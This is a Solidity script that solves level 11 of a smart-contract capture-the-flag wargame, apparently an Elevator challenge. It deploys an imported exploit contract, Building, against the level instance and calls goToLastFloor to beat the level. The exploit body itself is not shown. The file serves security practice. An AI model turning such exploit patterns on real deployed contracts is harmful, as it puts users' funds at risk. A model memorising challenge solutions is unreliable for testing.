// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IElevator.sol";
import "../src/exploits/Building.sol";

contract SolveLevel11 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0xB4802b28895ec64406e45dB504149bfE79A38A57;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IElevator instance = IElevator(instanceAddress);
        Building building = new Building(instance);

        building.goToLastFloor();
    }
}
